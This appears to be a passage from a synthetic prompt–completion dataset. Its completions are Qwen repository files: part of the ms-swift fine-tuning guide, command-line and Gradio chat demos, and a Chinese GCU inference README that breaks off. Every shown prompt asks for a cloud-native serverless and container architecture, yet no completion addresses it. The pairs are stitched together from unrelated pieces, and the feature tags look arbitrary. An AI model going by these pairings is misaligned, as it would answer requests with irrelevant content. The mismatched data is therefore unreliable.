ignore the loss calculation for `<think>\\n\\n</think>\\n\\n`, preventing the loss of reasoning ability. Refer to the training script [here](https://github.com/modelscope/ms-swift/blob/main/examples/train/think_model/qwen3_demo1.sh). The custom dataset format is as follows:\r\n\r\n```json\r\n{\"messages\": [\r\n    {\"role\": \"user\", \"content\": \"Where is the capital of Zhejiang?\"},\r\n    {\"role\": \"assistant\", \"content\": \"<think>\\n\\n</think>\\n\\nThe capital of Zhejiang is Hangzhou.\"}\r\n]}\r\n```\r\n\r\n**Option 2**: Add `/no_think` to the query in the dataset to avoid the loss of reasoning ability. Refer to the training script [here](https://github.com/modelscope/ms-swift/blob/main/examples/train/think_model/qwen3_demo2.sh). The custom dataset format is as follows:\r\n\r\n```json\r\n{\"messages\": [\r\n    {\"role\": \"user\", \"content\": \"Where is the capital of Zhejiang? /no_think\"},\r\n    {\"role\": \"assistant\", \"content\": \"<think>\\n\\n</think>\\n\\nThe capital of Zhejiang is Hangzhou.\"}\r\n]}\r\n```\r\n\r\n### 30-Minute Self-Cognition Fine-Tuning\r\n\r\nThis section introduces a 30-minute self-cognition fine-tuning process for the Qwen3-8B model. The required GPU memory is 22GB, and it can be run on the A10 provided by [ModelScope's free compute resources](https://modelscope.cn/my/mynotebook).\r\n\r\nAfter training, the model will identify itself as \"swift-robot,\" trained by \"swift,\" instead of its original self-cognition as \"Qwen,\" trained by Alibaba Cloud.\r\n\r\nIf you need to train in an offline environment, you can manually download the model and dataset and specify `--model <model-path>` and `--dataset <dataset-dir>`. The dataset can be found on [Modelscope Hub](https://modelscope.cn/datasets/swift/self-cognition).\r\n\r\nFor the meaning of each parameter in the training script, please refer to the [Command-line parameters documentation](https://swift.readthedocs.io/en/latest/Instruction/Command-line-parameters.html).\r\n\r\n```bash\r\nCUDA_VISIBLE_DEVICES=0 \\\r\nswift sft \\\r\n    --model Qwen/Qwen3-8B \\\r\n    --train_type lora \\\r\n    --dataset 'swift/Qwen3-SFT-Mixin#2000' \\\r\n              'swift/self-cognition:qwen3#600' \\\r\n    --torch_dtype bfloat16 \\\r\n    --num_train_epochs 1 \\\r\n    --per_device_train_batch_size 1 \\\r\n    --per_device_eval_batch_size 1 \\\r\n    --learning_rate 1e-4 \\\r\n    --lora_rank 8 \\\r\n    --lora_alpha 32 \\\r\n    --target_modules all-linear \\\r\n    --gradient_accumulation_steps 16 \\\r\n    --eval_steps 50 \\\r\n    --save_steps 50 \\\r\n    --save_total_limit 2 \\\r\n    --logging_steps 5 \\\r\n    --max_length 2048 \\\r\n    --output_dir output \\\r\n    --warmup_ratio 0.05 \\\r\n    --dataloader_num_workers 4 \\\r\n    --model_author swift \\\r\n    --model_name swift-robot\r\n```\r\n\r\nAfter fine-tuning, you can use the following script to test the fine-tuning results. Note that the `--adapters` section needs to be modified to the directory path of the last saved checkpoint:\r\n\r\n```bash\r\nCUDA_VISIBLE_DEVICES=0 \\\r\nswift infer \\\r\n    --adapters output/vx-xxx/checkpoint-xxx \\\r\n    --stream true \\\r\n    --temperature 0 \\\r\n    --max_new_tokens 2048\r\n```\r\n\r\n```text\r\n<<< who are you?\r\n<think>\r\nOkay, the user asked, \"who are you?\" I need to introduce myself. Let me start by stating my name, swift-robot. Then, I should mention that I'm an AI assistant developed by swift. I should explain my purpose, which is to provide information and assistance. I should also highlight my capabilities, like answering questions, generating text, and engaging in conversation. It's important to keep the tone friendly and approachable. Maybe add something about being here to help and encourage the user to ask anything. Let me check if I covered all the key points: name, developer, purpose, capabilities, and a welcoming statement. Yeah, that should do it. Now, let me put that into a concise and friendly response.\r\n</think>\r\n\r\nHello! I am swift-robot, an artificial intelligence assistant developed by swift. My purpose is to provide information and assistance to users like you. I can answer questions, generate text, and engage in conversations on a wide range of topics. I am here to help, so feel free to ask me anything you need!\r\n```\r\n\r\nBy default, ms-swift will use the ModelScope community to download models and datasets. If you want to use the HuggingFace community, you need to additionally specify `--use_hf true`.\r\n\r\nMerge LoRA weights:\r\n\r\n```shell\r\nswift export \\\r\n    --adapters output/checkpoint-xxx \\\r\n    --merge_lora true\r\n```\r\n\r\nPush the model to ModelScope/HuggingFace:\r\n\r\n```shell\r\n# If you are pushing the complete weights, you need to change `--adapters` to `--model`.\r\n# The Modelscope hub_token can be found here: https://modelscope.cn/my/myaccesstoken\r\nswift export \\\r\n    --adapters output/checkpoint-xxx \\\r\n    --push_to_hub true \\\r\n    --hub_model_id '<hub-model-id>' \\\r\n    --hub_token '<hub-token>' \\\r\n    --use_hf false\r\n```\r\n\r\nIf you want to use multiple GPUs for training, the following provides a demo for multi-GPU training:\r\n\r\n```shell\r\n# 4 * 60GB\r\n# You can run the experiment by setting `--dataset AI-ModelScope/alpaca-gpt4-data-en`.\r\n# Note: If you want to specify `--packing true`, you must additionally set `--attn_impl flash_attn`.\r\n\r\nNPROC_PER_NODE=4 \\\r\nCUDA_VISIBLE_DEVICES=0,1,2,3 \\\r\nswift sft \\\r\n    --model Qwen/Qwen3-8B \\\r\n    --train_type full \\\r\n    --dataset '<your-dataset>' \\\r\n    --torch_dtype bfloat16 \\\r\n    --per_device_train_batch_size 1 \\\r\n    --per_device_eval_batch_size 1 \\\r\n    --learning_rate 1e-5 \\\r\n    --gradient_accumulation_steps 4 \\\r\n    --packing true \\\r\n    --eval_steps 100 \\\r\n    --save_steps 100 \\\r\n    --logging_steps 5 \\\r\n    --max_length 8192 \\\r\n    --warmup_ratio 0.05 \\\r\n    --dataloader_num_workers 8 \\\r\n    --dataset_num_proc 8 \\\r\n    --save_total_limit 2 \\\r\n    --save_only_model true \\\r\n    --output_dir output \\\r\n    --deepspeed zero3 \\\r\n    --use_liger_kernel true \\\r\n    --attn_impl flash_attn\r\n```\r\n\r\n## Reinforcement Learning (RL)\r\n\r\nms-swift supports RLHF methods such as DPO, GRPO, DAPO, PPO, KTO, and more. This section will focus on an example of using ms-swift to perform GRPO training for Qwen3-8B.\r\n\r\nFor detailed RLHF support information, please refer to: [Supported Features](https://swift.readthedocs.io/en/latest/Instruction/Pre-training-and-Fine-tuning.html).\r\n\r\n### Environment Setup\r\n\r\nIn addition to installing the ms-swift related dependencies introduced above, the following dependencies also need to be installed:\r\n\r\n```shell\r\npip install \"math_verify==0.5.2\"\r\npip install vllm\r\n```\r\n\r\n### Data Preparation\r\n\r\nThe dataset format for GRPO training using ms-swift is similar to that of SFT, except that the assistant part of the last round is not required. If using accuracy as a reward, a `solution` column is needed to calculate the accuracy.\r\n\r\nExample Dataset Formats:\r\n\r\n```json\r\n{\"messages\": [{\"role\": \"user\", \"content\": \"Tell me tomorrow's weather\"}]}\r\n{\"messages\": [{\"role\": \"user\", \"content\": \"What is 1 + 1?\"}, {\"role\": \"assistant\", \"content\": \"It equals 2\"}, {\"role\": \"user\", \"content\": \"What about adding 1?\"}]}\r\n{\"messages\": [{\"role\": \"user\", \"content\": \"What is your name?\"}]}\r\n```\r\n\r\nFor dataset preparation for other RLHF algorithms, see: [Custom Dataset Documentation](https://swift.readthedocs.io/en/latest/Customization/Custom-dataset.html#rlhf).\r\n\r\nNotes on Dataset Requirements:\r\n\r\n- **Reward Function Calculation**: The dataset format depends on the reward function being used. Additional columns may be required to support specific reward calculations. For instance:\r\n\r\n  - When using the built-in accuracy or cosine similarity reward, the dataset must include a `solution` column to calculate the accuracy of the responses.\r\n  - Other columns in the dataset will be passed as `**kwargs` to the reward function for additional customization.\r\n\r\n- **Customizing the Reward Function**: To adapt the reward function to your specific needs, you can refer to the following resource: [External Reward Plugin](https://github.com/modelscope/ms-swift/tree/main/examples/train/grpo/plugin). This plugin provides examples and templates for implementing custom reward functions.\r\n\r\nDuring the training process, we use vLLM to accelerate the sampling process. By setting `num_infer_workers=8`, we deploy a vLLM engine for each device to speed up the sampling process.\r\n\r\n```shell\r\n# 70G*8\r\nCUDA_VISIBLE_DEVICES=0,1,2,3,4,5,6,7 \\\r\nNPROC_PER_NODE=8 \\\r\nswift rlhf \\\r\n    --rlhf_type grpo \\\r\n    --model Qwen/Qwen3-8B \\\r\n    --train_type full \\\r\n    --dataset 'AI-MO/NuminaMath-TIR#5000' \\\r\n    --torch_dtype bfloat16 \\\r\n    --num_train_epochs 1 \\\r\n    --per_device_train_batch_size 2 \\\r\n    --per_device_eval_batch_size 2 \\\r\n    --learning_rate 1e-6 \\\r\n    --save_total_limit 2 \\\r\n    --logging_steps 5 \\\r\n    --output_dir output \\\r\n    --gradient_accumulation_steps 1 \\\r\n    --warmup_ratio 0.05 \\\r\n    --dataloader_num_workers 4 \\\r\n    --max_completion_length 4096 \\\r\n    --vllm_max_model_len 8192 \\\r\n    --reward_funcs accuracy \\\r\n    --num_generations 16 \\\r\n    --use_vllm true \\\r\n    --vllm_gpu_memory_utilization 0.4 \\\r\n    --sleep_level 1 \\\r\n    --offload_model true \\\r\n    --offload_optimizer true \\\r\n    --gc_collect_after_offload true \\\r\n    --deepspeed zero3 \\\r\n    --num_infer_workers 8 \\\r\n    --tensor_parallel_size 1 \\\r\n    --temperature 1.0 \\\r\n    --top_p 0.85 \\\r\n    --log_completions true \\\r\n    --overlong_filter true\r\n```\r\n\r\n## Megatron-SWIFT\r\n\r\nms-swift incorporates Megatron parallelism techniques to accelerate the training of large models. The supported models can be found in the [Supported Models Documentation](https://swift.readthedocs.io/en/latest/Instruction/Supported-models-and-datasets.html).\r\n\r\nFor environment preparation and the conversion between HF and MCore model weights, you can refer to the [Megatron-SWIFT Training Documentation](https://swift.readthedocs.io/en/latest/Instruction/Megatron-SWIFT-Training.html). These topics will not be elaborated here.\r\n\r\nWe will use Alibaba Cloud DLC to start the training The training environment consists of 2 machines with 8 * 80GiB A800 GPUs. For more information on multi-node startup methods, refer to [here](https://github.com/modelscope/ms-swift/tree/main/examples/train/multi-node).\r\n\r\n```shell\r\n# https://help.aliyun.com/zh/pai/user-guide/general-environment-variables\r\n# Ensure that the weight-saving paths on the two nodes are identical.\r\nNNODES=$WORLD_SIZE \\\r\nNODE_RANK=$RANK \\\r\nmegatron sft \\\r\n    --load Qwen3-30B-A3B-Base-mcore \\\r\n    --dataset 'liucong/Chinese-DeepSeek-R1-Distill-data-110k-SFT' \\\r\n    --tensor_model_parallel_size 2 \\\r\n    --expert_model_parallel_size 8 \\\r\n    --moe_grouped_gemm true \\\r\n    --moe_shared_expert_overlap true \\\r\n    --moe_aux_loss_coeff 0.01 \\\r\n    --micro_batch_size 1 \\\r\n    --global_batch_size 16 \\\r\n    --packing true \\\r\n    --recompute_granularity full \\\r\n    --recompute_method uniform \\\r\n    --recompute_num_layers 1 \\\r\n    --train_iters 2000 \\\r\n    --eval_iters 50 \\\r\n    --finetune true \\\r\n    --cross_entropy_loss_fusion true \\\r\n    --lr 1e-5 \\\r\n    --lr_warmup_iters 100 \\\r\n    --min_lr 1e-6 \\\r\n    --save megatron_output/Qwen3-30B-A3B-Base \\\r\n    --eval_interval 200 \\\r\n    --save_interval 200 \\\r\n    --max_length 8192 \\\r\n    --num_workers 8 \\\r\n    --dataset_num_proc 8 \\\r\n    --no_save_optim true \\\r\n    --no_save_rng true \\\r\n    --sequence_parallel true \\\r\n    --use_flash_attn true\r\n```\r\n\r\nThe custom dataset format is the same as `swift sft`, which can be found in the previous section. Simply specify `--dataset <dataset_path>`.\r\n\r\nThe following is a comparison of training speed and GPU memory usage between `megatron sft` and `swift sft` for full-parameter fine-tuning of the Qwen3-30B-A3B model:\r\n\r\n|                  | Megatron-LM | DeepSpeed-ZeRO2 | DeepSpeed-ZeRO3 |\r\n| ---------------- | ----------- | --------------- | --------------- |\r\n| Training Speed   | 9.6s/it     | -               | 91.2s/it        |\r\n| GPU Memory Usage | 16 * 60GiB  | OOM             | 16 * 80GiB      |\r\n\r\n## Conclusion\r\n\r\nThe above is the best practice for training Qwen3 series models using ms-swift. If you encounter any difficulties during use, please join the discussion in [this issue](https://github.com/modelscope/ms-swift/issues/4030).\r\n", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "docs/source/training/ms_swift.md", "language": "markdown", "complexity": "complex", "star_count": 23335, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 328}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright (c) Alibaba Cloud.\n#\n# This source code is licensed under the license found in the\n# LICENSE file in the root directory of this source tree.\n\n\"\"\"A simple command-line interactive chat demo.\"\"\"\n\nimport argparse\nimport os\nimport platform\nimport shutil\nfrom copy import deepcopy\nfrom threading import Thread\n\nimport torch\nfrom transformers import AutoModelForCausalLM, AutoTokenizer, TextIteratorStreamer\nfrom transformers.trainer_utils import set_seed\n\nDEFAULT_CKPT_PATH = \"Qwen/Qwen2.5-7B-Instruct\"\n\n_WELCOME_MSG = \"\"\"\\\nWelcome to use Qwen2.5-Instruct model, type text to start chat, type :h to show command help.\n(欢迎使用 Qwen2.5-Instruct 模型，输入内容即可进行对话，:h 显示命令帮助。)\n\nNote: This demo is governed by the original license of Qwen2.5.\nWe strongly advise users not to knowingly generate or allow others to knowingly generate harmful content, including hate speech, violence, pornography, deception, etc.\n(注：本演示受Qwen2.5的许可协议限制。我们强烈建议，用户不应传播及不应允许他人传播以下内容，包括但不限于仇恨言论、暴力、色情、欺诈相关的有害信息。)\n\"\"\"\n_HELP_MSG = \"\"\"\\\nCommands:\n    :help / :h              Show this help message              显示帮助信息\n    :exit / :quit / :q      Exit the demo                       退出Demo\n    :clear / :cl            Clear screen                        清屏\n    :clear-history / :clh   Clear history                       清除对话历史\n    :history / :his         Show history                        显示对话历史\n    :seed                   Show current random seed            显示当前随机种子\n    :seed <N>               Set random seed to <N>              设置随机种子\n    :conf                   Show current generation config      显示生成配置\n    :conf <key>=<value>     Change generation config            修改生成配置\n    :reset-conf             Reset generation config             重置生成配置\n\"\"\"\n_ALL_COMMAND_NAMES = [\n    \"help\",\n    \"h\",\n    \"exit\",\n    \"quit\",\n    \"q\",\n    \"clear\",\n    \"cl\",\n    \"clear-history\",\n    \"clh\",\n    \"history\",\n    \"his\",\n    \"seed\",\n    \"conf\",\n    \"reset-conf\",\n]\n\n\ndef _setup_readline():\n    try:\n        import readline\n    except ImportError:\n        return\n\n    _matches = []\n\n    def _completer(text, state):\n        nonlocal _matches\n\n        if state == 0:\n            _matches = [\n                cmd_name for cmd_name in _ALL_COMMAND_NAMES if cmd_name.startswith(text)\n            ]\n        if 0 <= state < len(_matches):\n            return _matches[state]\n        return None\n\n    readline.set_completer(_completer)\n    readline.parse_and_bind(\"tab: complete\")\n\n\ndef _load_model_tokenizer(args):\n    tokenizer = AutoTokenizer.from_pretrained(\n        args.checkpoint_path,\n        resume_download=True,\n    )\n\n    if args.cpu_only:\n        device_map = \"cpu\"\n    else:\n        device_map = \"auto\"\n\n    model = AutoModelForCausalLM.from_pretrained(\n        args.checkpoint_path,\n        torch_dtype=\"auto\",\n        device_map=device_map,\n        resume_download=True,\n    ).eval()\n    model.generation_config.max_new_tokens = 2048  # For chat.\n\n    return model, tokenizer\n\n\ndef _gc():\n    import gc\n\n    gc.collect()\n    if torch.cuda.is_available():\n        torch.cuda.empty_cache()\n\n\ndef _clear_screen():\n    if platform.system() == \"Windows\":\n        os.system(\"cls\")\n    else:\n        os.system(\"clear\")\n\n\ndef _print_history(history):\n    terminal_width = shutil.get_terminal_size()[0]\n    print(f\"History ({len(history)})\".center(terminal_width, \"=\"))\n    for index, (query, response) in enumerate(history):\n        print(f\"User[{index}]: {query}\")\n        print(f\"Qwen[{index}]: {response}\")\n    print(\"=\" * terminal_width)\n\n\ndef _get_input() -> str:\n    while True:\n        try:\n            message = input(\"User> \").strip()\n        except UnicodeDecodeError:\n            print(\"[ERROR] Encoding error in input\")\n            continue\n        except KeyboardInterrupt:\n            exit(1)\n        if message:\n            return message\n        print(\"[ERROR] Query is empty\")\n\n\ndef _chat_stream(model, tokenizer, query, history):\n    conversation = []\n    for query_h, response_h in history:\n        conversation.append({\"role\": \"user\", \"content\": query_h})\n        conversation.append({\"role\": \"assistant\", \"content\": response_h})\n    conversation.append({\"role\": \"user\", \"content\": query})\n    input_text = tokenizer.apply_chat_template(\n        conversation,\n        add_generation_prompt=True,\n        tokenize=False,\n    )\n    inputs = tokenizer([input_text], return_tensors=\"pt\").to(model.device)\n    streamer = TextIteratorStreamer(\n        tokenizer=tokenizer, skip_prompt=True, timeout=60.0, skip_special_tokens=True\n    )\n    generation_kwargs = {\n        **inputs,\n        \"streamer\": streamer,\n    }\n    thread = Thread(target=model.generate, kwargs=generation_kwargs)\n    thread.start()\n\n    for new_text in streamer:\n        yield new_text\n\n\ndef main():\n    parser = argparse.ArgumentParser(\n        description=\"Qwen2.5-Instruct command-line interactive chat demo.\"\n    )\n    parser.add_argument(\n        \"-c\",\n        \"--checkpoint-path\",\n        type=str,\n        default=DEFAULT_CKPT_PATH,\n        help=\"Checkpoint name or path, default to %(default)r\",\n    )\n    parser.add_argument(\"-s\", \"--seed\", type=int, default=1234, help=\"Random seed\")\n    parser.add_argument(\n        \"--cpu-only\", action=\"store_true\", help=\"Run demo with CPU only\"\n    )\n    args = parser.parse_args()\n\n    history, response = [], \"\"\n\n    model, tokenizer = _load_model_tokenizer(args)\n    orig_gen_config = deepcopy(model.generation_config)\n\n    _setup_readline()\n\n    _clear_screen()\n    print(_WELCOME_MSG)\n\n    seed = args.seed\n\n    while True:\n        query = _get_input()\n\n        # Process commands.\n        if query.startswith(\":\"):\n            command_words = query[1:].strip().split()\n            if not command_words:\n                command = \"\"\n            else:\n                command = command_words[0]\n\n            if command in [\"exit\", \"quit\", \"q\"]:\n                break\n            elif command in [\"clear\", \"cl\"]:\n                _clear_screen()\n                print(_WELCOME_MSG)\n                _gc()\n                continue\n            elif command in [\"clear-history\", \"clh\"]:\n                print(f\"[INFO] All {len(history)} history cleared\")\n                history.clear()\n                _gc()\n                continue\n            elif command in [\"help\", \"h\"]:\n                print(_HELP_MSG)\n                continue\n            elif command in [\"history\", \"his\"]:\n                _print_history(history)\n                continue\n            elif command in [\"seed\"]:\n                if len(command_words) == 1:\n                    print(f\"[INFO] Current random seed: {seed}\")\n                    continue\n                else:\n                    new_seed_s = command_words[1]\n                    try:\n                        new_seed = int(new_seed_s)\n                    except ValueError:\n                        print(\n                            f\"[WARNING] Fail to change random seed: {new_seed_s!r} is not a valid number\"\n                        )\n                    else:\n                        print(f\"[INFO] Random seed changed to {new_seed}\")\n                        seed = new_seed\n                    continue\n            elif command in [\"conf\"]:\n                if len(command_words) == 1:\n                    print(model.generation_config)\n                else:\n                    for key_value_pairs_str in command_words[1:]:\n                        eq_idx = key_value_pairs_str.find(\"=\")\n                        if eq_idx == -1:\n                            print(\"[WARNING] format: <key>=<value>\")\n                            continue\n                        conf_key, conf_value_str = (\n                            key_value_pairs_str[:eq_idx],\n                            key_value_pairs_str[eq_idx + 1 :],\n                        )\n                        try:\n                            conf_value = eval(conf_value_str)\n                        except Exception as e:\n                            print(e)\n                            continue\n                        else:\n                            print(\n                                f\"[INFO] Change config: model.generation_config.{conf_key} = {conf_value}\"\n                            )\n                            setattr(model.generation_config, conf_key, conf_value)\n                continue\n            elif command in [\"reset-conf\"]:\n                print(\"[INFO] Reset generation config\")\n                model.generation_config = deepcopy(orig_gen_config)\n                print(model.generation_config)\n                continue\n            else:\n                # As normal query.\n                pass\n\n        # Run chat.\n        set_seed(seed)\n        _clear_screen()\n        print(f\"\\nUser: {query}\")\n        print(f\"\\nQwen: \", end=\"\")\n        try:\n            partial_text = \"\"\n            for new_text in _chat_stream(model, tokenizer, query, history):\n                print(new_text, end=\"\", flush=True)\n                partial_text += new_text\n            response = partial_text\n            print()\n\n        except KeyboardInterrupt:\n            print(\"[WARNING] Generation interrupted\")\n            continue\n\n        history.append((query, response))\n\n\nif __name__ == \"__main__\":\n    main()\n", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "examples/demo/cli_demo.py", "language": "python", "complexity": "complex", "star_count": 23335, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 298}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright (c) Alibaba Cloud.\n#\n# This source code is licensed under the license found in the\n# LICENSE file in the root directory of this source tree.\n\n\"\"\"A simple web interactive chat demo based on gradio.\"\"\"\n\nfrom argparse import ArgumentParser\nfrom threading import Thread\n\nimport gradio as gr\nimport torch\nfrom transformers import AutoModelForCausalLM, AutoTokenizer, TextIteratorStreamer\n\nDEFAULT_CKPT_PATH = \"Qwen/Qwen2.5-7B-Instruct\"\n\n\ndef _get_args():\n    parser = ArgumentParser(description=\"Qwen2.5-Instruct web chat demo.\")\n    parser.add_argument(\n        \"-c\",\n        \"--checkpoint-path\",\n        type=str,\n        default=DEFAULT_CKPT_PATH,\n        help=\"Checkpoint name or path, default to %(default)r\",\n    )\n    parser.add_argument(\n        \"--cpu-only\", action=\"store_true\", help=\"Run demo with CPU only\"\n    )\n\n    parser.add_argument(\n        \"--share\",\n        action=\"store_true\",\n        default=False,\n        help=\"Create a publicly shareable link for the interface.\",\n    )\n    parser.add_argument(\n        \"--inbrowser\",\n        action=\"store_true\",\n        default=False,\n        help=\"Automatically launch the interface in a new tab on the default browser.\",\n    )\n    parser.add_argument(\n        \"--server-port\", type=int, default=8000, help=\"Demo server port.\"\n    )\n    parser.add_argument(\n        \"--server-name\", type=str, default=\"127.0.0.1\", help=\"Demo server name.\"\n    )\n\n    args = parser.parse_args()\n    return args\n\n\ndef _load_model_tokenizer(args):\n    tokenizer = AutoTokenizer.from_pretrained(\n        args.checkpoint_path,\n        resume_download=True,\n    )\n\n    if args.cpu_only:\n        device_map = \"cpu\"\n    else:\n        device_map = \"auto\"\n\n    model = AutoModelForCausalLM.from_pretrained(\n        args.checkpoint_path,\n        torch_dtype=\"auto\",\n        device_map=device_map,\n        resume_download=True,\n    ).eval()\n    model.generation_config.max_new_tokens = 2048  # For chat.\n\n    return model, tokenizer\n\n\ndef _chat_stream(model, tokenizer, query, history):\n    conversation = []\n    for query_h, response_h in history:\n        conversation.append({\"role\": \"user\", \"content\": query_h})\n        conversation.append({\"role\": \"assistant\", \"content\": response_h})\n    conversation.append({\"role\": \"user\", \"content\": query})\n    input_text = tokenizer.apply_chat_template(\n        conversation,\n        add_generation_prompt=True,\n        tokenize=False,\n    )\n    inputs = tokenizer([input_text], return_tensors=\"pt\").to(model.device)\n    streamer = TextIteratorStreamer(\n        tokenizer=tokenizer, skip_prompt=True, timeout=60.0, skip_special_tokens=True\n    )\n    generation_kwargs = {\n        **inputs,\n        \"streamer\": streamer,\n    }\n    thread = Thread(target=model.generate, kwargs=generation_kwargs)\n    thread.start()\n\n    for new_text in streamer:\n        yield new_text\n\n\ndef _gc():\n    import gc\n\n    gc.collect()\n    if torch.cuda.is_available():\n        torch.cuda.empty_cache()\n\n\ndef _launch_demo(args, model, tokenizer):\n    def predict(_query, _chatbot, _task_history):\n        print(f\"User: {_query}\")\n        _chatbot.append((_query, \"\"))\n        full_response = \"\"\n        response = \"\"\n        for new_text in _chat_stream(model, tokenizer, _query, history=_task_history):\n            response += new_text\n            _chatbot[-1] = (_query, response)\n\n            yield _chatbot\n            full_response = response\n\n        print(f\"History: {_task_history}\")\n        _task_history.append((_query, full_response))\n        print(f\"Qwen: {full_response}\")\n\n    def regenerate(_chatbot, _task_history):\n        if not _task_history:\n            yield _chatbot\n            return\n        item = _task_history.pop(-1)\n        _chatbot.pop(-1)\n        yield from predict(item[0], _chatbot, _task_history)\n\n    def reset_user_input():\n        return gr.update(value=\"\")\n\n    def reset_state(_chatbot, _task_history):\n        _task_history.clear()\n        _chatbot.clear()\n        _gc()\n        return _chatbot\n\n    with gr.Blocks() as demo:\n        gr.Markdown(\"\"\"\\\n<p align=\"center\"><img src=\"https://qianwen-res.oss-accelerate-overseas.aliyuncs.com/assets/logo/qwen2.5_logo.png\" style=\"height: 120px\"/><p>\"\"\")\n        gr.Markdown(\n            \"\"\"\\\n<center><font size=3>This WebUI is based on Qwen2.5-Instruct, developed by Alibaba Cloud. \\\n(本WebUI基于Qwen2.5-Instruct打造，实现聊天机器人功能。)</center>\"\"\"\n        )\n        gr.Markdown(\"\"\"\\\n<center><font size=4>\nQwen2.5-7B-Instruct <a href=\"https://modelscope.cn/models/qwen/Qwen2.5-7B-Instruct/summary\">🤖 </a> | \n<a href=\"https://huggingface.co/Qwen/Qwen2.5-7B-Instruct\">🤗</a>&nbsp ｜ \nQwen2.5-32B-Instruct <a href=\"https://modelscope.cn/models/qwen/Qwen2.5-32B-Instruct/summary\">🤖 </a> | \n<a href=\"https://huggingface.co/Qwen/Qwen2.5-32B-Instruct\">🤗</a>&nbsp ｜ \nQwen2.5-72B-Instruct <a href=\"https://modelscope.cn/models/qwen/Qwen2.5-72B-Instruct/summary\">🤖 </a> | \n<a href=\"https://huggingface.co/Qwen/Qwen2.5-72B-Instruct\">🤗</a>&nbsp ｜ \n&nbsp<a href=\"https://github.com/QwenLM/Qwen2.5\">Github</a></center>\"\"\")\n\n        chatbot = gr.Chatbot(label=\"Qwen\", elem_classes=\"control-height\")\n        query = gr.Textbox(lines=2, label=\"Input\")\n        task_history = gr.State([])\n\n        with gr.Row():\n            empty_btn = gr.Button(\"🧹 Clear History (清除历史)\")\n            submit_btn = gr.Button(\"🚀 Submit (发送)\")\n            regen_btn = gr.Button(\"🤔️ Regenerate (重试)\")\n\n        submit_btn.click(\n            predict, [query, chatbot, task_history], [chatbot], show_progress=True\n        )\n        submit_btn.click(reset_user_input, [], [query])\n        empty_btn.click(\n            reset_state, [chatbot, task_history], outputs=[chatbot], show_progress=True\n        )\n        regen_btn.click(\n            regenerate, [chatbot, task_history], [chatbot], show_progress=True\n        )\n\n        gr.Markdown(\"\"\"\\\n<font size=2>Note: This demo is governed by the original license of Qwen2.5. \\\nWe strongly advise users not to knowingly generate or allow others to knowingly generate harmful content, \\\nincluding hate speech, violence, pornography, deception, etc. \\\n(注：本演示受Qwen2.5的许可协议限制。我们强烈建议，用户不应传播及不应允许他人传播以下内容，\\\n包括但不限于仇恨言论、暴力、色情、欺诈相关的有害信息。)\"\"\")\n\n    demo.queue().launch(\n        share=args.share,\n        inbrowser=args.inbrowser,\n        server_port=args.server_port,\n        server_name=args.server_name,\n    )\n\n\ndef main():\n    args = _get_args()\n\n    model, tokenizer = _load_model_tokenizer(args)\n\n    _launch_demo(args, model, tokenizer)\n\n\nif __name__ == \"__main__\":\n    main()\n", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "examples/demo/web_demo.py", "language": "python", "complexity": "complex", "star_count": 23335, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 207}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Qwen2.5 推理\n\n## 1、配置运行环境\n\n**安装驱动**\n\n```\n# <version_id> 为软件包具体版本号。\nchmod +x TopsRider_i3x_<version_id>_deb_amd64.run\n./TopsRider_i3x_<version_id>_deb_amd64.run -y\n```\n\n**创建并启动 docker**\n\n```\n# 创建 docker 容器，将在基础镜像 artifact.enflame.cn/enflame_docker_images/ubuntu/qic_ubuntu_2004_gcc9:1.4.4 的基础上创建 docker。\n# <project_path> 当前工程所在路径\n# -e ENFLAME_VISIBLE_DEVICES=2 进行 GCU 资源隔离，如需多卡可以改为 0,1,2,3 等\ndocker run -itd -e ENFLAME_VISIBLE_DEVICES=2 --name qwen-infer -v <project_path>:/work -v /root/:/root/ --privileged --network host  artifact.enflame.cn/enflame_docker_images/ubuntu/qic_ubuntu_2004_gcc9:1.4.4 bash\n```\n\n**进入 docker 安装环境**\n\n```\n# 进入 docker 容器\ndocker exec -it qwen-infer bash\n\n# 安装 SDK 框架，进入软件包所在地址。\n# <version_id> 为软件包具体版本号。\n./TopsRider_i3x_<version_id>_amd64.run -C torch-gcu-2 -y\n./TopsRider_i3x_<version_id>_deb_amd64.run -C tops-sdk -y\n\n# 安装 python 库\npip3.8 install transformers==4.40.2\npip3.8 install accelerate\n```\n\n## 2、推理\n\n```\n# 进入本工程目录，包含运行代码、推理输入等文件。\n.\n├── README.md\n└── gcu_demo.py\n```\n\n**启动推理示例**\n\n```\npython3.8 gcu_demo.py\n```\n执行 gcu_demo.py 推理示例，代码改编自 [仓库 README](https://github.com/QwenLM/Qwen2.5/blob/main/README.md) 中的给的 Huggingface quick start 用例。\n\n**GCU 